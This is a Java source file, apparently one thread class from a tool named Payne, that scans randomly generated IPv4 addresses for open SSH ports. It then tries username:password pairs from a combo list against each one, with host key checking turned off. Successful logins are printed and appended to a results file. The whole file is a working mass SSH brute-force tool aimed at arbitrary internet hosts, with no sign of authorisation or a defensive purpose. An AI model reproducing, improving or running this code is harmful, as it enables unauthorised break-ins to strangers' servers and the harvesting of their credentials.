package uk.tsis.payne.threads;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import sun.reflect.annotation.ExceptionProxy;
import uk.tsis.payne.Payne;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

public class Scanner implements Runnable {

    public static int p = 0;
    private int sshPort;
    private int timeout;
    private File file;

    public Scanner(int sshPort, int timeout, File file) {
        this.sshPort = sshPort;
        this.timeout = timeout;
        this.file = file;
    }

    @Override
    public void run() {
        while (true) {
            String host = Payne.gen();
            if (Payne.x.contains(host)){ continue;}
            if (host.split("\\.")[0].equals("127")){ continue;}
            Payne.x.add(host);

            try {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(host, sshPort), timeout);
                socket.close();
                System.out.println(" ]Starting brute [" + host + "]");

                List<String> combos = Files.readAllLines(Paths.get(file.getAbsolutePath()));
                p++;
                for (String combo : combos) {
                    String[] c = combo.split(":");
                    try {
                        JSch jsch = new JSch();
                        Session session = jsch.getSession(c[0], host, sshPort);
                        session.setPassword(c[1]);
                        java.util.Properties config = new java.util.Properties();
                        config.put("StrictHostKeyChecking", "no");
                        session.setConfig(config);
                        session.setTimeout(4500);
                        session.connect();
                        session.disconnect();
                        System.out.println(" ]Brute Success [" + host + "] [" + c[0] + ":" + c[1] + "]");
                        Payne.results.add(host + ":" + sshPort + ":" + c[0] + ":" + c[1]);
                        PrintWriter writer = new PrintWriter(new FileWriter(Payne.resultFile, true));
                        writer.write("\n " + host + ":" + sshPort + ":" + c[0] + ":" + c[1]);
                        writer.flush();
                        writer.close();
                        Thread.sleep(500);
                        break;
                    } catch (JSchException e) {
                        if (e.getMessage().contains("refused") || e.getMessage().contains("foreign host") ||
                            e.getMessage().contains("reset") || e.getMessage().contains("reset by peer")){
                            continue;
                        }
                    }catch (IOException e){
                        e.printStackTrace();
                    }
                }
                p--;
            } catch (Exception e) {

            }
            try {
                Thread.sleep(1000);
            } catch (Exception e) {

            }

        }
    }
}
